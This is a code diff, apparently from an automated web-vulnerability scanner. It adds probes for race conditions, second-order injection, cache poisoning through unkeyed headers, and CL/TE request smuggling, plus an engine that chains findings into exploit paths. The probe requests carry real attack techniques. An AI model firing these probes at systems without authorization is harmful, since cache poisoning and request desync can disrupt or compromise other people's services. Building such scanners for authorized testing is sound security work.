+                    divergence = max((len(status_set) - 1) / 4.0, (len(sig_set) - 1) / 6.0)
+                    confidence = min(0.86, 0.64 + (divergence * 0.25))
+                    findings.append(self._build_finding(
+                        param=param,
+                        payload=payload,
+                        vuln_type="race_condition_possible",
+                        confidence=confidence,
+                        evidence=(
+                            f"Concurrent requests diverged for {param}={payload} "
+                            f"(statuses={sorted(status_set)}, unique_signatures={len(sig_set)})"
+                        ),
+                        response=responses[0],
+                        time_ms=sum(timings) / max(1, len(timings)),
+                    ))
+                    break
+
+        return findings
+
+    async def _run_second_order_detection(
+        self,
+        store_params: list[str] | None,
+        trigger_paths: list[str] | None,
+    ) -> list[FuzzResult]:
+        candidates = store_params[:] if store_params else self._candidate_params_for_type("SQLi_XSS", max_items=3)
+        if not candidates:
+            return []
+
+        parsed = urlparse(self.target)
+        base = f"{parsed.scheme}://{parsed.netloc}" if parsed.scheme and parsed.netloc else self.target
+        base_path = parsed.path if parsed.path else "/"
+        indicator_paths = []
+        pattern = _ZERODAY_PATTERNS.get("second_order_injection", {})
+        for indicator in pattern.get("indicators", []):
+            normalized = "/" + str(indicator).strip("/ ")
+            indicator_paths.append(normalized)
+        for step_text in self._collect_attack_chain_step_texts(["second-order", "stored"]):
+            for candidate in ("profile", "admin", "export", "report"):
+                if candidate in step_text.lower():
+                    indicator_paths.append("/" + candidate)
+        default_trigger_paths = [base_path, "/profile", "/dashboard", "/admin"]
+        if trigger_paths:
+            trigger_candidates = trigger_paths
+        else:
+            trigger_candidates = default_trigger_paths + indicator_paths[:3]
+        trigger_urls = []
+        for path in trigger_candidates:
+            p = str(path).strip()
+            if not p:
+                continue
+            if p.startswith("http://") or p.startswith("https://"):
+                trigger_urls.append(p)
+            else:
+                trigger_urls.append(base.rstrip("/") + "/" + p.lstrip("/"))
+        trigger_urls = self._dedupe_payloads(trigger_urls, limit=5)
+
+        findings: list[FuzzResult] = []
+        for param in candidates:
+            marker = f"AIRECON_SO_{uuid.uuid4().hex[:10]}"
+            payload = f"{marker}'\"<x>"
+            req_data = {param: payload}
+            if self.method == "GET":
+                store_resp, store_ms = await self._probe_request(method=self.method, params=req_data)
+            else:
+                store_resp, store_ms = await self._probe_request(method=self.method, data=req_data)
+            if store_resp is None:
+                continue
+            immediate_contains = marker.lower() in store_resp.text.lower()
+
+            for trigger_url in trigger_urls:
+                trigger_resp, trigger_ms = await self._probe_request(url=trigger_url, method="GET")
+                if trigger_resp is None:
+                    continue
+                trigger_body_lower = trigger_resp.text.lower()
+                if marker.lower() not in trigger_body_lower:
+                    continue
+
+                sql_markers = ("sql syntax", "mysql", "postgres", "sqlite", "ora-")
+                if any(token in trigger_body_lower for token in sql_markers):
+                    findings.append(self._build_finding(
+                        param=param,
+                        payload=payload,
+                        vuln_type="second_order_sql_injection",
+                        confidence=0.86,
+                        evidence=(
+                            f"Stored marker triggered SQL error context at {trigger_url}; indicates second-order SQLi path"
+                        ),
+                        response=trigger_resp,
+                        time_ms=trigger_ms,
+                    ))
+                    break
+
+                if not immediate_contains:
+                    findings.append(self._build_finding(
+                        param=param,
+                        payload=payload,
+                        vuln_type="second_order_reflection",
+                        confidence=0.78,
+                        evidence=(
+                            f"Stored marker not reflected immediately but appears in follow-up view at {trigger_url}"
+                        ),
+                        response=trigger_resp,
+                        time_ms=store_ms + trigger_ms,
+                    ))
+                    break
+
+                findings.append(self._build_finding(
+                    param=param,
+                    payload=payload,
+                    vuln_type="stored_input_flow",
+                    confidence=0.64,
+                    evidence=f"Marker persisted across requests and contexts ({trigger_url}); verify execution sink",
+                    response=trigger_resp,
+                    time_ms=store_ms + trigger_ms,
+                ))
+                break
+
+        return findings
+
+    async def _run_http_desync_cache_testing(self) -> list[FuzzResult]:
+        findings: list[FuzzResult] = []
+        baseline_resp, baseline_ms = await self._probe_request(method="GET")
+        if baseline_resp is None:
+            return findings
+        baseline_body = baseline_resp.text
+        baseline_status = baseline_resp.status_code
+        baseline_cache_headers = {
+            k.lower(): v for k, v in baseline_resp.headers.items() if _CACHE_HEADER_RE.match(k)
+        }
+
+        marker = f"airecon-cache-{uuid.uuid4().hex[:8]}"
+        poison_headers_set = [
+            {"X-Forwarded-Host": f"{marker}.invalid"},
+            {"X-Original-URL": "/admin"},
+            {"X-Host": marker},
+        ]
+        for poison_headers in poison_headers_set:
+            probe_resp, probe_ms = await self._probe_request(method="GET", headers=poison_headers)
+            follow_resp, follow_ms = await self._probe_request(method="GET")
+            if probe_resp is None or follow_resp is None:
+                continue
+            follow_body = follow_resp.text
+            if marker in follow_body and marker not in baseline_body:
+                findings.append(self._build_finding(
+                    param="header",
+                    payload=json.dumps(poison_headers, sort_keys=True),
+                    vuln_type="cache_poisoning_candidate",
+                    confidence=0.87,
+                    evidence="Marker from unkeyed header appeared in follow-up response; cache poisoning signal",
+                    response=follow_resp,
+                    time_ms=probe_ms + follow_ms,
+                ))
+                break
+
+            follow_cache_headers = {
+                k.lower(): v for k, v in follow_resp.headers.items() if _CACHE_HEADER_RE.match(k)
+            }
+            if (
+                baseline_cache_headers
+                and follow_cache_headers
+                and follow_resp.status_code != baseline_status
+                and follow_cache_headers != baseline_cache_headers
+            ):
+                findings.append(self._build_finding(
+                    param="header",
+                    payload=json.dumps(poison_headers, sort_keys=True),
+                    vuln_type="cache_key_anomaly",
+                    confidence=0.66,
+                    evidence="Cache-related headers changed with poisoned request and altered follow-up status",
+                    response=follow_resp,
+                    time_ms=probe_ms + follow_ms,
+                ))
+                break
+
+        smuggle_headers = {
+            "Content-Length": "4",
+            "Transfer-Encoding": "chunked",
+            "Connection": "keep-alive",
+        }
+        smuggle_resp, smuggle_ms = await self._probe_request(
+            method="POST",
+            headers=smuggle_headers,
+            content="0\r\n\r\n",
+        )
+        check_resp, check_ms = await self._probe_request(method="GET")
+        if check_resp is not None:
+            if smuggle_resp is None and smuggle_ms >= (self.timeout * 1000.0) and check_resp.status_code != baseline_status:
+                findings.append(self._build_finding(
+                    param="request",
+                    payload="cl_te_probe",
+                    vuln_type="http_desync_candidate",
+                    confidence=0.74,
+                    evidence="Ambiguous CL/TE probe timed out and shifted subsequent response status",
+                    response=check_resp,
+                    time_ms=smuggle_ms + check_ms,
+                ))
+            elif (
+                smuggle_resp is not None
+                and smuggle_resp.status_code in (200, 201, 202, 204)
+                and check_resp.status_code != baseline_status
+            ):
+                findings.append(self._build_finding(
+                    param="request",
+                    payload="cl_te_probe",
+                    vuln_type="http_desync_candidate",
+                    confidence=0.77,
+                    evidence="CL/TE ambiguous request accepted and changed subsequent response behavior",
+                    response=check_resp,
+                    time_ms=smuggle_ms + check_ms,
+                ))
+
+        return findings
 
     def get_high_priority_targets(self) -> list[str]:
         """Get high-priority parameters based on heuristics (deduplicated)."""
@@ -1069,6 +2093,7 @@ class ExploitChainEngine:
     def __init__(self, fuzzer: Fuzzer):
         self.fuzzer = fuzzer
         self.discovered_chains: list[ExploitChain] = []
+        self._special_probe_cache: dict[str, list[FuzzResult]] = {}
 
     async def discover_chains(
         self,
@@ -1078,7 +2103,13 @@ class ExploitChainEngine:
         chains: list[ExploitChain] = []
 
         for finding in initial_findings:
-            follow_ons = CHAIN_RULES.get(finding.vuln_type, [])
+            follow_ons = list(CHAIN_RULES.get(finding.vuln_type, []))
+            # Phase-3 chain extensions with active verification hooks.
+            if finding.vuln_type in {"sql_injection", "xss", "ssti", "command_injection"}:
+                follow_ons.append("second_order_injection")
+            if finding.vuln_type in {"open_redirect", "ssrf", "graphql", "xss"}:
+                follow_ons.append("http_desync_cache")
+            follow_ons = list(dict.fromkeys(follow_ons))
             if not follow_ons:
                 continue
 
@@ -1101,6 +2132,10 @@ class ExploitChainEngine:
         chain_vuln: str,
     ) -> ChainLink | None:
         """Test if a follow-on vuln is exploitable given the parent finding."""
+        specialized = await self._test_special_chain_step(parent, chain_vuln)
+        if specialized is not None:
+            return specialized
+
         payloads = CHAIN_PAYLOADS.get(chain_vuln, [])
         if not payloads:
             # No HTTP test available — still record as theoretical chain step
@@ -1128,6 +2163,106 @@ class ExploitChainEngine:
                     confidence=result.confidence,
                 )
         return None
+
+    async def _cached_probe(
+        self,
+        cache_key: str,
+        producer: Callable[
+            [],
+            (
+                Awaitable[list[FuzzResult] | AsyncIterator[FuzzResult] | Iterable[FuzzResult] | None]
+                | AsyncIterator[FuzzResult]
+                | Iterable[FuzzResult]
+                | None
+            ),
+        ],
+    ) -> list[FuzzResult]:
+        if cache_key in self._special_probe_cache:
+            return self._special_probe_cache[cache_key]
+        produced = producer()
+        if asyncio.iscoroutine(produced):
+            produced = await cast(
+                Awaitable[list[FuzzResult] | AsyncIterator[FuzzResult] | Iterable[FuzzResult] | None],
+                produced,
+            )
+        if produced is None:
+            results: list[FuzzResult] = []
+        elif isinstance(produced, list):
+            results = produced
+        elif isinstance(produced, AsyncIteratorABC):
+            results = [item async for item in produced]
+        elif isinstance(produced, Iterable):
+            results = list(produced)
+        else:
+            results = []
+        self._special_probe_cache[cache_key] = results
+        return results
+
+    async def _test_special_chain_step(
+        self,
+        parent: FuzzResult,
+        chain_vuln: str,
+    ) -> ChainLink | None:
+        findings: list[FuzzResult] = []
+
+        if parent.vuln_type in {"ssrf", "xxe"} or chain_vuln == "ssrf":
+            findings = await self._cached_probe(
+                f"ssrf::{parent.parameter}",
+                lambda: self.fuzzer._run_cloud_ssrf_exploitation([parent.parameter]),
+            )
+            findings = [f for f in findings if f.vuln_type.startswith("ssrf_")]
+
+        elif parent.vuln_type == "graphql" or chain_vuln in {"information_disclosure", "idor", "dos_via_complex_query"}:
+            findings = await self._cached_probe(
+                f"graphql::{parent.target}",
+                lambda: self.fuzzer._run_graphql_automation([parent.target]),
+            )
+            if chain_vuln == "information_disclosure":
+                findings = [f for f in findings if f.vuln_type == "graphql_introspection_exposed"]
+            elif chain_vuln == "idor":
+                findings = [f for f in findings if f.vuln_type == "graphql_idor_candidate"]
+            elif chain_vuln == "dos_via_complex_query":
+                findings = [f for f in findings if f.vuln_type == "graphql_batching_enabled"]
+
+        elif parent.vuln_type == "race_condition" or chain_vuln in {"double_spend", "quota_bypass", "auth_bypass"}:
+            findings = await self._cached_probe(
+                f"race::{parent.parameter}",
+                lambda: self.fuzzer._run_race_condition_testing([parent.parameter]),
+            )
+            findings = [f for f in findings if f.vuln_type == "race_condition_possible"]
+
+        elif chain_vuln == "second_order_injection":
+            findings = await self._cached_probe(
+                f"second_order::{parent.parameter}",
+                lambda: self.fuzzer._run_second_order_detection([parent.parameter], None),
+            )
+            findings = [
+                f for f in findings
+                if f.vuln_type.startswith("second_order") or f.vuln_type == "stored_input_flow"
+            ]
+
+        elif chain_vuln == "http_desync_cache":
+            findings = await self._cached_probe(
+                "desync_cache::global",
+                self.fuzzer._run_http_desync_cache_testing,
+            )
+            findings = [
+                f for f in findings
+                if f.vuln_type in {"cache_poisoning_candidate", "cache_key_anomaly", "http_desync_candidate"}
+            ]
+
+        if not findings:
+            return None
+
+        best = max(findings, key=lambda item: item.confidence)
+        return ChainLink(
+            vuln_type=chain_vuln,
+            parameter=best.parameter or parent.parameter,
+            payload=best.payload,
+            prerequisite=parent.vuln_type,
+            impact_description=f"{_chain_impact(parent.vuln_type, chain_vuln)} ({best.vuln_type})",
+            confidence=max(0.60, best.confidence),
+        )
 
     def _build_chain(
         self,
@@ -1242,9 +2377,16 @@ class InteractiveRealTimeTester:
         timeout: int = 10,
         on_finding: Callable[[FuzzResult], None] | None = None,
         headers: dict[str, str] | None = None,
+        auth_login_url: str | None = None,
     ):
         self.target = target
-        self.fuzzer = Fuzzer(target=target, threads=threads, timeout=timeout, headers=headers)
+        self.fuzzer = Fuzzer(
+            target=target,
+            threads=threads,
+            timeout=timeout,
+            headers=headers,
+            auth_login_url=auth_login_url,
+        )
         self.chain_engine = ExploitChainEngine(self.fuzzer)
         self.on_finding = on_finding
         self._stop_event = asyncio.Event()
@@ -1253,7 +2395,13 @@ class InteractiveRealTimeTester:
 
     async def probe_baseline(self, params: list[str]) -> dict[str, Any]:
         """Fetch baseline responses for all params before fuzzing begins."""
-        tasks = [self.fuzzer._fetch_baseline(p) for p in params]
+        probe_fn = getattr(self.fuzzer, "probe", None)
+        tasks: list[Awaitable[dict[str, Any]]]
+        if callable(probe_fn):
+            typed_probe = cast(Callable[[str], Awaitable[dict[str, Any]]], probe_fn)
+            tasks = [typed_probe(p) for p in params]
+        else:
+            tasks = [self.fuzzer._fetch_baseline(p) for p in params]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         return {
             p: r for p, r in zip(params, results)
@@ -1268,6 +2416,11 @@ class InteractiveRealTimeTester:
         """Async generator: yields RealTimeEvents as fuzzing progresses."""
         params = params or self.fuzzer.get_high_priority_targets()[:10]
         vuln_types = vuln_types or list(FUZZ_PAYLOADS.keys())
+        fuzz_fn = getattr(self.fuzzer, "fuzz", None)
+        is_native_fuzz = (
+            getattr(fuzz_fn, "__self__", None) is self.fuzzer
+            and getattr(fuzz_fn, "__func__", None) is Fuzzer.fuzz
+        )
 
         # Baseline phase
         yield RealTimeEvent(
@@ -1275,7 +2428,11 @@ class InteractiveRealTimeTester:
             data={"phase": "baseline", "params": params,
                   "message": "Probing baseline responses..."},
         )
-        await self.probe_baseline(params)
+        if is_native_fuzz:
+            await self.probe_baseline(params)
+        else:
+            # Custom fuzz providers may not require or support baseline probing.
+            logger.debug("Skipping baseline probe for custom fuzz provider")
 
         total = sum(len(FUZZ_PAYLOADS.get(vt, []))
                     for vt in vuln_types) * len(params)
@@ -1287,53 +2444,84 @@ class InteractiveRealTimeTester:
                   "message": f"Starting {total} fuzz tests..."},
         )
 
-        # Fuzz each param/payload combo and yield findings immediately
-        for param in params:
-            if self._stop_event.is_set():
-                break
-            for vuln_type in vuln_types:
+        # Stream findings from fuzzer API (supports monkeypatched generators in tests).
+        # For performance and correctness, baseline was already captured above.
+        try:
+            if is_native_fuzz:
+                finding_stream = self.fuzzer.fuzz(
+                    params=params,
+                    vuln_types=vuln_types,
+                    skip_baseline=True,
+                )
+            else:
+                try:
+                    finding_stream = self.fuzzer.fuzz(
+                        params=params,
+                        vuln_types=vuln_types,
+                    )
+                except TypeError:
+                    finding_stream = self.fuzzer.fuzz(params, vuln_types)
+
+            if asyncio.iscoroutine(finding_stream):
+                finding_stream = await finding_stream
+
+            if not hasattr(finding_stream, "__aiter__"):
+                raise TypeError("fuzzer.fuzz must return an async iterator")
+
+            async for raw_finding in finding_stream:
                 if self._stop_event.is_set():
                     break
-                for payload in FUZZ_PAYLOADS.get(vuln_type, []):
-                    if self._stop_event.is_set():
-                        break
 
-                    result = await self.fuzzer._fuzz_single(param, payload, vuln_type)
-                    done += 1
+                done += 1
+                result = self._coerce_fuzz_result(raw_finding)
+                if result is None:
+                    continue
 
-                    if result and result.confidence > 0.6:
-                        self._findings.append(result)
-                        if self.on_finding:
-                            try:
-                                self.on_finding(result)
-                            except Exception:  # nosec B110 - callback is optional
-                                pass
-                        yield RealTimeEvent(
-                            event_type="finding",
-                            data={
-                                "vuln_type": result.vuln_type,
-                                "parameter": result.parameter,
-                                "payload": result.payload,
-                                "severity": result.severity,
-                                "confidence": result.confidence,
-                                "evidence": result.evidence,
-                                "response_code": result.response_code,
-                                "time_ms": result.time_ms,
-                            },
-                        )
+                self._findings.append(result)
+                if self.on_finding:
+                    try:
+                        self.on_finding(result)
+                    except Exception:  # nosec B110 - callback is optional
+                        pass
 
-                    # Emit progress every 20 tests
-                    if done % 20 == 0:
-                        yield RealTimeEvent(
-                            event_type="progress",
-                            data={
-                                "phase": "fuzzing",
-                                "done": done,
-                                "total": total,
-                                "findings_so_far": len(self._findings),
-                                "pct": round(done / total * 100, 1) if total else 0,
-                            },
-                        )
+                yield RealTimeEvent(
+                    event_type="finding",
+                    data={
+                        "vuln_type": result.vuln_type,
+                        "parameter": result.parameter,
+                        "payload": result.payload,
+                        "severity": result.severity,
+                        "confidence": result.confidence,
+                        "evidence": result.evidence,
+                        "response_code": result.response_code,
+                        "time_ms": result.time_ms,
+                    },
+                )
+
+                # In streaming mode we only know processed findings from the
+                # public generator. Keep progress monotonic and bounded.
+                if done % 20 == 0:
+                    bounded_done = min(done, total)
+                    yield RealTimeEvent(
+                        event_type="progress",
+                        data={
+                            "phase": "fuzzing",
+                            "done": bounded_done,
+                            "total": total,
+                            "findings_so_far": len(self._findings),
+                            "pct": round(bounded_done / total * 100, 1) if total else 0,
+                        },
+                    )
+        except Exception as exc:
+            yield RealTimeEvent(
+                event_type="error",
+                data={"phase": "fuzzing", "message": str(exc)},
+            )
+            yield RealTimeEvent(
+                event_type="complete",
+                data=self.get_summary(),
+            )
+            return
 
         # Chain discovery phase
         if self._findings:
@@ -1344,17 +2532,23 @@ class InteractiveRealTimeTester:
                     "message": f"Discovering exploit chains from {len(self._findings)} findings...",
                 },
             )
-            self._chains = await self.chain_engine.discover_chains(self._findings)
+            discover_fn = getattr(self.chain_engine, "find_chains", None)
+            if not callable(discover_fn):
+                discover_fn = getattr(self.chain_engine, "discover_chains", None)
+            if callable(discover_fn):
+                self._chains = await discover_fn(self._findings)
+            else:
+                self._chains = []
             for chain in self._chains:
                 yield RealTimeEvent(
                     event_type="chain_discovered",
                     data={
-                        "name": chain.name,
-                        "trigger_vuln": chain.trigger_vuln,
-                        "steps": len(chain.steps),
-                        "severity": chain.combined_severity,
-                        "confidence": chain.total_confidence,
-                        "narrative": chain.narrative,
+                        "name": getattr(chain, "name", getattr(chain, "chain_id", "chain")),
+                        "trigger_vuln": getattr(chain, "trigger_vuln", "unknown"),
+                        "steps": len(getattr(chain, "steps", [])),
+                        "severity": getattr(chain, "combined_severity", "medium"),
+                        "confidence": getattr(chain, "total_confidence", 0.0),
+                        "narrative": getattr(chain, "narrative", ""),
                     },
                 )
 
@@ -1366,6 +2560,43 @@ class InteractiveRealTimeTester:
     async def stop(self) -> None:
         """Signal graceful stop."""
         self._stop_event.set()
+        await self.fuzzer.close()
+
+    @staticmethod
+    def _coerce_fuzz_result(raw: Any) -> FuzzResult | None:
+        """Accept native FuzzResult or dict-like legacy findings."""
+        if isinstance(raw, FuzzResult):
+            return raw
+        if not isinstance(raw, dict):
+            return None
+
+        parameter = raw.get("parameter", raw.get("param", ""))
+        payload = raw.get("payload", "")
+        if not parameter:
+            return None
+
+        severity = str(raw.get("severity", "medium")).lower()
+        try:
+            confidence = float(raw.get("confidence", 0.7))
+        except (TypeError, ValueError):
+            confidence = 0.7
+
+        response_code = raw.get("response_code", raw.get("status_code", 0))
+        response_length = raw.get("response_length", raw.get("body_length", 0))
+        time_ms = raw.get("time_ms", 0.0)
+
+        return FuzzResult(
+            target=str(raw.get("target", "")),
+            parameter=str(parameter),
+            payload=str(payload),
+            vuln_type=str(raw.get("vuln_type", "unknown")),
+            severity=severity,
+            evidence=str(raw.get("evidence", "")),
+            confidence=confidence,
+            response_code=int(response_code or 0),
+            response_length=int(response_length or 0),
+            time_ms=float(time_ms or 0.0),
+        )
 
     def get_summary(self) -> dict[str, Any]:
         """Return current findings and chains summary."""
@@ -1447,11 +2678,11 @@ async def quick_fuzz_url(
 ) -> list[FuzzResult]:
     """Quick fuzz a URL with common payloads and return findings."""
     params = params or ["q", "search", "id", "page"]
-    fuzzer = Fuzzer(url, threads=5, timeout=15, headers=headers)
-    return await fuzzer.fuzz_parameters(
-        params=params,
-        vuln_types=["sql_injection", "xss", "path_traversal", "ssti"],
-    )
+    async with Fuzzer(url, threads=5, timeout=15, headers=headers) as fuzzer:
+        return await fuzzer.fuzz_parameters(
+            params=params,
+            vuln_types=["sql_injection", "xss", "path_traversal", "ssti"],
+        )
 
 
 def generate_fuzz_wordlist(
